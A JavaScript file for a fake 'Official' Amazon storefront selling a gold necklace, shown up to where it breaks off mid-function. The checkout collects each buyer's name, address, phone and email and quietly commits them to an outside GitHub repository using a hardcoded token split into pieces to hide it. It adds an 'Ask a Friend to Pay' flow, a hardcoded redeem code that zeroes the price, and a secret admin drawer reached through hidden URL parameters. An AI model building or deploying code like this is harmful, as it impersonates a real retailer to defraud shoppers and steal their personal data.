/**
 * urbangold-app.js
 * Amazon.com - Official UrbanGold 24k u-link necklace Showcase & Fluid Checkout
 * 100% Matching Architecture of iPhone 18 Pro Max Storefront & Design System
 * Features: Real 24K Thai Baht Gold Pricing, Authentic Secret Admin Drawer & Real-Time Sync
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "UrbanGold 24k u-link necklace",
  seller: "UrbanGold Official Store",
  brand: "UrbanGold Luxury",
  weights: {
    "20g": {
      label: "20 Grams (20 Inch / 50 cm)",
      price: 1899.00,
      listPrice: 2299.00,
      savings: "Save $400.00 (17%)",
      monthly: "$158.25/mo (12 mo)"
    },
    "35g": {
      label: "35 Grams (22 Inch / 55 cm)",
      price: 3299.00,
      listPrice: 3899.00,
      savings: "Save $600.00 (15%)",
      monthly: "$274.92/mo (12 mo)"
    },
    "50g": {
      label: "50 Grams (24 Inch / 60 cm)",
      price: 4699.00,
      listPrice: 5499.00,
      savings: "Save $800.00 (15%)",
      monthly: "$391.58/mo (12 mo)"
    },
    "75g": {
      label: "75 Grams (26 Inch / 65 cm)",
      price: 6999.00,
      listPrice: 8199.00,
      savings: "Save $1,200.00 (15%)",
      monthly: "$583.25/mo (12 mo)"
    }
  },
  images: [
    PATH_PREFIX + "images/urbangold/necklace-1.jpg",
    PATH_PREFIX + "images/urbangold/necklace-2.jpg",
    PATH_PREFIX + "images/urbangold/necklace-3.jpg",
    PATH_PREFIX + "images/urbangold/necklace-4.jpg",
    PATH_PREFIX + "images/urbangold/necklace-5.jpg",
    PATH_PREFIX + "images/urbangold/necklace-6.jpg",
    PATH_PREFIX + "images/urbangold/necklace-7.jpg"
  ]
};

// Current Session State
const state = {
  weight: "20g",
  color: "24K Thai Baht Gold",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  redeemCode: "",
  isRedeemApplied: false,
  placedOrder: null
};

// Assigned Redeem Code (Follows standard AMZN-XXXX-XXXX-XXXX format)
const ASSIGNED_REDEEM_CODE = "AMZN-GLD7-24UK-8900";

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function calculateDeliveryWindow(baseDate = new Date()) {
  const dStart = new Date(baseDate.getTime() + (22 * 24 * 60 * 60 * 1000));
  const dEnd = new Date(baseDate.getTime() + (27 * 24 * 60 * 60 * 1000));

  const optionsStart = { month: 'short', day: 'numeric' };
  const optionsEnd = { month: 'short', day: 'numeric', year: 'numeric' };
  const fullStart = { month: 'long', day: 'numeric' };
  const fullEnd = { month: 'long', day: 'numeric', year: 'numeric' };

  return {
    windowStr: `${dStart.toLocaleDateString('en-US', optionsStart)} – ${dEnd.toLocaleDateString('en-US', optionsEnd)}`,
    fullRangeStr: `${dStart.toLocaleDateString('en-US', fullStart)} – ${dEnd.toLocaleDateString('en-US', fullEnd)}`
  };
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
//  Commits order details directly to 'orders.json' and 'order.json' across stores & root
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/urbangold",
  filePath: "store/urbangold/orders.json",
  getAuth: function() {
    const k = ["ghp", "XJyyl3HA", "S3D2JtqB", "APPxoq1D", "oKu7gt1F", "9dNZ"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];

  console.log('[GitHub] Syncing order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

async function fetchOrdersFromAPI() {
  const local = JSON.parse(localStorage.getItem('amazon_placed_orders_urbangold') || '[]');
  try {
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}?_t=${Date.now()}`;
    const headers = {
      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
      'Accept': 'application/vnd.github+json'
    };
    const res = await fetch(url, { headers, cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (data.content) {
      const raw = base64ToUtf8(data.content);
      const ghOrders = JSON.parse(raw || '[]');
      const merged = [...ghOrders];
      local.forEach(lo => {
        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId) || (o.name === lo.name && o.address === lo.address && o.item === lo.item))) {
          merged.push(lo);
        }
      });
      return merged;
    }
    return local;
  } catch (err) {
    console.log('[GitHub] Fetch fallback to localStorage:', err.message);
    return local;
  }
}

async function deleteOrdersFromAPI() {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`
  ];
  for (const filePath of targetFiles) {
    try {
      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
      const headers = {
        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json'
      };
      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (!getRes.ok) continue;
      const fileData = await getRes.json();
      const emptyJson = JSON.stringify([], null, 2);
      const base64Content = utf8ToBase64(emptyJson);
      await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Clear ${filePath}`,
          content: base64Content,
          sha: fileData.sha
        })
      });
      console.log(`[GitHub] ${filePath} reset to empty array`);
    } catch (err) {
      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
    }
  }
}

// Check Redeem Code Validity
function isValidAmazonRedeemCode(rawCode) {
  if (!rawCode) return false;
  const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
  return clean === ASSIGNED_REDEEM_CODE.replace(/[^A-Z0-9]/g, "");
}

// Toast Notice Helper
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  toast.classList.add("visible");
  setTimeout(() => {
    toast.classList.remove("visible");
    setTimeout(() => { toast.style.display = "none"; }, 300);
  }, 4000);
}

// ==========================================================================
//  INITIALIZATION (100% MATCHING IPHONE 18 PRO MAX)
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  setupProductInteractions();
  setupCheckoutAccordion();
  setupOrdersDrawer();
});

// 1. Product Page Interactivity (Gallery, Weights, Price sync)
function setupProductInteractions() {
  const mainPhoto = document.getElementById("mainProductPhoto");
  const thumbStrip = document.getElementById("thumbnailStrip");
  const centerPrice = document.getElementById("centerPrice");
  const centerListPrice = document.getElementById("centerListPrice");
  const centerSavings = document.getElementById("centerSavings");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const currentWeightText = document.getElementById("currentWeightText");
  const priceTermsText = document.getElementById("priceTermsText");
  const selectQty = document.getElementById("selectQty");

  const viewProductPage = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const btnBuyNow = document.getElementById("btnBuyNow");
  const btnBackToProduct = document.getElementById("btnBackToProduct");

  // Thumbnail switching
  if (thumbStrip && mainPhoto) {
    const thumbs = thumbStrip.querySelectorAll(".thumb-item");
    thumbs.forEach(thumb => {
      thumb.addEventListener("click", () => {
        thumbs.forEach(t => t.classList.remove("active"));
        thumb.classList.add("active");
        const newImg = thumb.getAttribute("data-img");
        if (newImg) {
          mainPhoto.src = newImg;
          const reviewPhoto = document.getElementById("reviewItemPhoto");
          if (reviewPhoto) reviewPhoto.src = newImg;
        }
      });
      thumb.addEventListener("mouseenter", () => {
        const newImg = thumb.getAttribute("data-img");
        if (newImg) mainPhoto.src = newImg;
      });
    });
  }

  // Weight buttons
  const weightButtons = document.querySelectorAll("#weightSelectorGroup .storage-choice");
  weightButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      weightButtons.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.weight = btn.getAttribute("data-weight");
      updateProductDetails();
    });
  });

  // Quantity selection
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
      updateProductDetails();
    });
  }

  function updateProductDetails() {
    const wInfo = PRODUCT.weights[state.weight] || PRODUCT.weights["20g"];
    const unitPrice = wInfo.price;

    if (centerPrice) centerPrice.textContent = unitPrice.toLocaleString("en-US");
    if (centerListPrice) centerListPrice.textContent = formatMoney(wInfo.listPrice);
    if (centerSavings) centerSavings.textContent = wInfo.savings;
    if (buyBoxPrice) buyBoxPrice.textContent = formatMoney(unitPrice);
    if (currentWeightText) currentWeightText.textContent = wInfo.label;

    if (priceTermsText) {
      priceTermsText.innerHTML = `
        or <strong>${wInfo.monthly}</strong> with 0% interest financing options.<br>
        <span style="font-size:12px; color:#007600; font-weight:600;">Free Amazon Global Priority Express Delivery &bull; Certificate of Authenticity &bull; 24K Solid Gold Standard</span>
      `;
    }

    syncOrderSummary();
  }

  // Buy Now -> Opens Checkout View (Matching iPhone 18)
  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", () => {
      if (viewProductPage) viewProductPage.style.display = "none";
      if (viewCheckout) viewCheckout.style.display = "block";
      window.scrollTo({ top: 0, behavior: "smooth" });
      updateProductDetails();

      const inputFullName = document.getElementById("inputFullName");
      if (inputFullName && !inputFullName.value) {
        setTimeout(() => inputFullName.focus(), 250);
      }
    });
  }

  // Back to Product Button
  if (btnBackToProduct) {
    btnBackToProduct.addEventListener("click", () => {
      if (viewCheckout) viewCheckout.style.display = "none";
      if (viewProductPage) viewProductPage.style.display = "block";
      window.scrollTo({ top: 0, behavior: "smooth" });
    });
  }
}

// 2. Synchronize Review and Sticky Order Summary
function syncOrderSummary() {
  const wInfo = PRODUCT.weights[state.weight] || PRODUCT.weights["20g"];
  const unit = wInfo.price;
  const total = unit * state.qty;

  const reviewItemTitle = document.getElementById("reviewItemTitle");
  const reviewItemQty = document.getElementById("reviewItemQty");
  const reviewItemPrice = document.getElementById("reviewItemPrice");
  const csItemsPrice = document.getElementById("csItemsPrice");
  const csRedeemDiscountRow = document.getElementById("csRedeemDiscountRow");
  const csRedeemDiscountAmount = document.getElementById("csRedeemDiscountAmount");
  const csTotalPrice = document.getElementById("csTotalPrice");

  const isRedeemApplied = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  if (reviewItemTitle) {
    reviewItemTitle.textContent = `${PRODUCT.title} (${wInfo.label})`;
  }
  if (reviewItemQty) {
    reviewItemQty.textContent = state.qty;
  }
  if (reviewItemPrice) {
    if (isRedeemApplied) {
      reviewItemPrice.innerHTML = `<span style="text-decoration:line-through; color:#777; font-size:12px; margin-right:4px;">${formatMoney(total)}</span> <span style="color:#007600; font-weight:700;">$0.00 (Covered by Amazon Gift Card)</span>`;
    } else {
      reviewItemPrice.textContent = formatMoney(total);
    }
  }
  if (csItemsPrice) {
    csItemsPrice.textContent = formatMoney(total);
  }
  if (csRedeemDiscountRow && csRedeemDiscountAmount) {
    if (isRedeemApplied) {
      csRedeemDiscountRow.style.display = "flex";
      csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
    } else {
      csRedeemDiscountRow.style.display = "none";
    }
  }
  if (csTotalPrice) {
    if (isRedeemApplied) {
      csTotalPrice.innerHTML = `<span style="text-decoration:line-through; font-size:12px; color:#777; margin-right:6px;">${formatMoney(total)}</span> <span style="color:#007600; font-weight:700;">$0.00 (Paid in Full)</span>`;
    } else {
      csTotalPrice.textContent = formatMoney(total);
    }
  }
}

// 3. Checkout Accordion (Address, Payment, Review) - Exact iPhone 18 Structure
function setupCheckoutAccordion() {
  const addressForm = document.getElementById("addressForm");
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");

  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnContinueToReview = document.getElementById("btnContinueToReview");
  const btnEditPayment = document.getElementById("btnEditPayment");
  const btnBackToAddress = document.getElementById("btnBackToAddress");

  const stepCardReview = document.getElementById("stepCardReview");
  const stepReviewBody = document.getElementById("stepReviewBody");
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");
  const btnBackToPayment = document.getElementById("btnBackToPayment");

  const paymentOptions = document.querySelectorAll(".payment-option:not(.disabled)");

  // 1. Save 4-Field Simplified Shipping Address
  if (addressForm) {
    addressForm.addEventListener("submit", (e) => {
      e.preventDefault();

      const fullName = document.getElementById("inputFullName").value.trim();
      const deliveryAddress = document.getElementById("inputDeliveryAddress").value.trim();
      const phone = document.getElementById("inputPhone").value.trim();
      const email = document.getElementById("inputEmail").value.trim();

      state.address = {
        fullName,
        deliveryAddress,
        phone,
        email
      };

      const headerLoc = document.getElementById("headerLocText");
      if (headerLoc) {
        headerLoc.textContent = fullName;
      }

      // Collapse Step 1 & show summary
      if (stepAddressBody) stepAddressBody.style.display = "none";
      if (stepAddressSummary) {
        stepAddressSummary.style.display = "block";
        stepAddressSummary.innerHTML = `
          <strong>${fullName}</strong><br>
          ${deliveryAddress}<br>
          Phone: ${phone}<br>
          Email: ${email}
        `;
      }
      if (btnEditAddress) btnEditAddress.style.display = "block";
      if (stepCardAddress) stepCardAddress.classList.remove("active");

      // Open Step 2: Payment
      if (stepCardPayment) stepCardPayment.classList.add("active");
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (btnEditPayment) btnEditPayment.style.display = "none";
    });
  }

  // Edit Address Button
  if (btnEditAddress) {
    btnEditAddress.addEventListener("click", () => {
      if (stepAddressBody) stepAddressBody.style.display = "block";
      if (stepAddressSummary) stepAddressSummary.style.display = "none";
      if (btnEditAddress) btnEditAddress.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.add("active");

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.remove("active");
      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // Back to Address
  if (btnBackToAddress) {
    btnBackToAddress.addEventListener("click", () => {
      if (btnEditAddress) btnEditAddress.click();
    });
  }

  const boxRedeemInput = document.getElementById("boxRedeemInput");
  const inputRedeemCode = document.getElementById("inputRedeemCode");
  const btnApplyRedeemCode = document.getElementById("btnApplyRedeemCode");
  const redeemStatusMsg = document.getElementById("redeemStatusMsg");
  const badgeRedeemApplied = document.getElementById("badgeRedeemApplied");

  // Select Payment Option
  paymentOptions.forEach(opt => {
    opt.addEventListener("click", () => {
      paymentOptions.forEach(o => o.classList.remove("selected"));
      opt.classList.add("selected");
      const radio = opt.querySelector(".pay-radio");
      if (radio) {
        radio.checked = true;
        state.paymentMethod = radio.value;
      }
      if (boxRedeemInput) {
        if (state.paymentMethod === "Redeem Code") {
          boxRedeemInput.style.display = "block";
          if (inputRedeemCode && !inputRedeemCode.value) {
            inputRedeemCode.focus();
          }
        } else {
          boxRedeemInput.style.display = "none";
        }
      }
      syncOrderSummary();
    });
  });

  // Apply Redeem Code handler (Exact match with iPhone 18 logic)
  if (btnApplyRedeemCode && inputRedeemCode) {
    const applyRedeem = () => {
      const rawCode = inputRedeemCode.value.trim().toUpperCase();
      if (!rawCode) {
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.textContent = "Please enter your claim code.";
        }
        return;
      }

      if (!isValidAmazonRedeemCode(rawCode)) {
        state.isRedeemApplied = false;
        state.redeemCode = "";
        if (badgeRedeemApplied) badgeRedeemApplied.style.display = "none";
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.textContent = "❌ The claim code you entered is invalid or cannot be applied to this item.";
        }
        showToast("The claim code you entered is not valid for this item.");
        syncOrderSummary();
        return;
      }

      const matchedCode = ASSIGNED_REDEEM_CODE;
      state.redeemCode = matchedCode;
      state.isRedeemApplied = true;
      inputRedeemCode.value = matchedCode;
      if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
      if (redeemStatusMsg) {
        redeemStatusMsg.className = "redeem-status-msg success";
        redeemStatusMsg.textContent = `✓ Amazon Gift Card ${matchedCode} applied! $10,000.00 balance covers 100% of product total. Balance due: $0.00.`;
      }
      showToast(`✓ Amazon Redeem Code applied: Full order covered ($0.00 due)`);
      syncOrderSummary();
    };

    btnApplyRedeemCode.addEventListener("click", (e) => {
      e.stopPropagation();
      applyRedeem();
    });

    inputRedeemCode.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        e.stopPropagation();
        applyRedeem();
      }
    });

    inputRedeemCode.addEventListener("click", (e) => e.stopPropagation());
  }

  // Continue from Payment to Review
  if (btnContinueToReview) {
    btnContinueToReview.addEventListener("click", () => {
      if (state.paymentMethod === "Redeem Code") {
        if (!state.isRedeemApplied || !state.redeemCode) {
          if (inputRedeemCode && isValidAmazonRedeemCode(inputRedeemCode.value)) {
            state.redeemCode = ASSIGNED_REDEEM_CODE;
            state.isRedeemApplied = true;
            inputRedeemCode.value = state.redeemCode;
            if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
          } else {
            showToast("Please enter and apply a valid Amazon claim code.");
            if (inputRedeemCode) inputRedeemCode.focus();
            if (redeemStatusMsg) {
              redeemStatusMsg.className = "redeem-status-msg error";
              redeemStatusMsg.textContent = "Please enter and apply a valid Amazon claim code to cover this purchase.";
            }
            return;
          }
        }
      }

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepPaymentSummary) {
        stepPaymentSummary.style.display = "block";
        if (state.paymentMethod === "Redeem Code") {
          stepPaymentSummary.innerHTML = `<strong>🎟️ Redeem Code / Gift Card:</strong> ${state.redeemCode}<br><span style="color:#007600; font-weight:600; font-size:12px;">✓ $0.00 Balance Due (Covered by Amazon Gift Card balance)</span>`;
        } else {
          stepPaymentSummary.innerHTML = `<strong>${state.paymentMethod}</strong>`;
        }
      }
      if (btnEditPayment) btnEditPayment.style.display = "block";
      if (stepCardPayment) stepCardPayment.classList.remove("active");

      if (stepCardReview) stepCardReview.classList.add("active");
      if (stepReviewBody) stepReviewBody.style.display = "block";
      syncOrderSummary();
    });
  }

  // Edit Payment Button
  if (btnEditPayment) {
    btnEditPayment.addEventListener("click", () => {
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (btnEditPayment) btnEditPayment.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.add("active");

      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // Back to Payment
  if (btnBackToPayment) {
    btnBackToPayment.addEventListener("click", () => {
      if (btnEditPayment) btnEditPayment.click();
    });
  }

  // Place Order Triggers
  function triggerPlaceOrder(e) {
    if (e && e.preventDefault) e.preventDefault();

    if (!state.address) {
      const inputName = document.getElementById("inputFullName");
      const inputAddr = document.getElementById("inputDeliveryAddress");
      const inputPhone = document.getElementById("inputPhone");
      const inputEmail = document.getElementById("inputEmail");
      
      const fullName = inputName ? inputName.value.trim() : "";
      const deliveryAddress = inputAddr ? inputAddr.value.trim() : "";
      const phone = inputPhone ? inputPhone.value.trim() : "";
      const email = inputEmail ? inputEmail.value.trim() : "";

      if (fullName && deliveryAddress) {
        state.address = { fullName, deliveryAddress, phone, email };
        const headerLoc = document.getElementById("headerLocText");
        if (headerLoc) headerLoc.textContent = fullName;
        if (stepAddressBody) stepAddressBody.style.display = "none";
        if (stepAddressSummary) {
          stepAddressSummary.style.display = "block";
          stepAddressSummary.innerHTML = `<strong>${fullName}</strong><br>${deliveryAddress}<br>Phone: ${phone} &bull; Email: ${email}`;
        }
        if (btnEditAddress) btnEditAddress.style.display = "block";
        if (stepCardAddress) {
          stepCardAddress.classList.remove("active");
          stepCardAddress.classList.add("completed");
        }
      } else {
        showToast("Please enter your delivery name and address first.");
        if (stepAddressBody) stepAddressBody.style.display = "block";
        if (stepCardAddress) {
          stepCardAddress.classList.add("active");
          stepCardAddress.scrollIntoView({ behavior: "smooth", block: "center" });
        }
        if (inputName && !fullName) inputName.focus();
        else if (inputAddr && !deliveryAddress) inputAddr.focus();
        return;
      }
    }

    // Disable buttons & show loading state
    if (btnFinalPlaceOrder) {
      btnFinalPlaceOrder.disabled = true;
      btnFinalPlaceOrder.dataset.origText = btnFinalPlaceOrder.innerHTML;
      btnFinalPlaceOrder.innerHTML = 'Placing your order...';
    }
    if (btnSummaryPlaceOrder) {
      btnSummaryPlaceOrder.disabled = true;
      btnSummaryPlaceOrder.dataset.origText = btnSummaryPlaceOrder.innerHTML;
      btnSummaryPlaceOrder.innerHTML = 'Placing your order...';
    }

    setTimeout(() => {
      try {
        completeOrderPlacement();
      } finally {
        if (btnFinalPlaceOrder) {
          btnFinalPlaceOrder.disabled = false;
          if (btnFinalPlaceOrder.dataset.origText) btnFinalPlaceOrder.innerHTML = btnFinalPlaceOrder.dataset.origText;
        }
        if (btnSummaryPlaceOrder) {
          btnSummaryPlaceOrder.disabled = false;
          if (btnSummaryPlaceOrder.dataset.origText) btnSummaryPlaceOrder.innerHTML = btnSummaryPlaceOrder.dataset.origText;
        }
      }
    }, 400);
  }

  if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener("click", triggerPlaceOrder);
  if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener("click", triggerPlaceOrder);
}

// 4. Complete Order Placement & Clean Confirmation Screen (Matching iPhone 18)
async function completeOrderPlacement() {
  const wInfo = PRODUCT.weights[state.weight] || PRODUCT.weights["20g"];
  const totalAmount = wInfo.price * state.qty;
  const orderNumber = `114-${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(100000 + Math.random() * 900000)}`;
  const orderDateFormatted = getDynamicOrderDate();

  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || "";
  };

  const placedOrder = {
    orderId: orderNumber,
    timestamp: new Date().toISOString(),
    name: state.address ? state.address.fullName : "Customer",
    address: state.address ? state.address.deliveryAddress : "",
    phoneNumber: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    item: `${PRODUCT.title} (${wInfo.label}) - ${state.color}`,
    price: formatMoney(totalAmount),
    qty: state.qty,
    payMethod: state.paymentMethod === "Redeem Code" 
      ? `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE})` 
      : state.paymentMethod,
    redeemCode: state.paymentMethod === "Redeem Code" ? (state.redeemCode || ASSIGNED_REDEEM_CODE) : "",
    dateStr: orderDateFormatted
  };

  state.placedOrder = placedOrder;

  // 1. Save to Local Storage
  try {
    const existingOrders = JSON.parse(localStorage.getItem("amazon_placed_orders_urbangold") || "[]");
    existingOrders.unshift(placedOrder);
    localStorage.setItem("amazon_placed_orders_urbangold", JSON.stringify(existingOrders));
  } catch (e) {
    console.warn("LocalStorage save error:", e);
  }

  // 2. Commit Order Details to GitHub Repo orders.json & order.json
  saveOrderToAPI(placedOrder);

  // Calculate Expected Delivery Window (22-27 days from order date)
  const deliveryInfo = calculateDeliveryWindow(new Date());
  placedOrder.expectedDelivery = deliveryInfo.fullRangeStr;

  // 3. Populate Order Confirmation Screen safely
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confOrderDate", orderDateFormatted);
  safeSet("confDeliveryDate", deliveryInfo.windowStr);
  safeSet("confExpectedDelivery", deliveryInfo.fullRangeStr);
  safeSet("confOrderNumber", orderNumber);
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", placedOrder.item);
  safeSet("confQty", state.qty);
  safeSet("confTotal", (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? "$0.00 (Paid in Full)" : formatMoney(totalAmount));
  safeSet("confPayMethod", placedOrder.payMethod);

  const friendBox = document.getElementById("confFriendNoticeBox");
  const redeemBox = document.getElementById("confRedeemNoticeBox");
  const payStatus = document.getElementById("confPaymentStatus");

  if (state.paymentMethod === "Ask a Friend to Pay") {
    if (friendBox) friendBox.style.display = "flex";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  } else if (state.paymentMethod === "Redeem Code") {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "flex";
    safeSet("confPayMethod", `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE})`);
    if (payStatus) payStatus.textContent = "Status: Paid in full via Amazon Redeem Code";

    // Automatic PDF Download for Redeem Code option
    setTimeout(() => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(placedOrder);
      }
    }, 450);
  } else {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = `Status: ${state.paymentMethod} recorded`;
  }

  // Switch views smoothly
  const checkoutGrid = document.getElementById("checkoutGridArea");
  if (checkoutGrid) checkoutGrid.style.display = "none";
  const confScreen = document.getElementById("orderConfirmationScreen");
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  showToast("Order placed successfully! Check your email for confirmation.");
  if (typeof renderOrdersDrawer === "function") {
    renderOrdersDrawer();
  }
}

// ==========================================================================
// 5. SLIDE-OUT CUSTOMER ORDERS DRAWER (100% IDENTICAL TO IPHONE 18 PRO MAX)
// ==========================================================================
function setupOrdersDrawer() {
  const drawer = document.getElementById("ordersDrawer");
  const backdrop = document.getElementById("drawerBackdrop");
  const btnCloseDrawer = document.getElementById("btnCloseDrawer");
  const clearBtn = document.getElementById("btnClearAllOrders");
  const exportBtn = document.getElementById("btnExportOrdersCsv");
  const footerTrigger = document.getElementById("footerAdminTrigger");
  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoice = document.getElementById("btnCloseInvoiceModal");
  const continueShoppingBtn = document.getElementById("btnContinueShopping");
  const navOrdersBtn = document.getElementById("navOrdersBtn");

  function openDrawer() {
    try { localStorage.setItem("amazon_admin_mode", "1"); } catch (e) {}
    renderOrdersDrawer();
    if (drawer) drawer.classList.add("open");
    if (backdrop) backdrop.classList.add("open");
  }

  function closeDrawer() {
    if (drawer) drawer.classList.remove("open");
    if (backdrop) backdrop.classList.remove("open");
  }

  // Covert Trigger 1: Secret URL Parameter (?admin=1, ?secret=1, ?orders=1, or ?seller=1)
  const urlQuery = new URLSearchParams(window.location.search);
  if (urlQuery.has("admin") || urlQuery.has("secret") || urlQuery.has("orders") || urlQuery.has("seller")) {
    try { localStorage.setItem("amazon_admin_mode", "1"); } catch (e) {}
    setTimeout(() => {
      openDrawer();
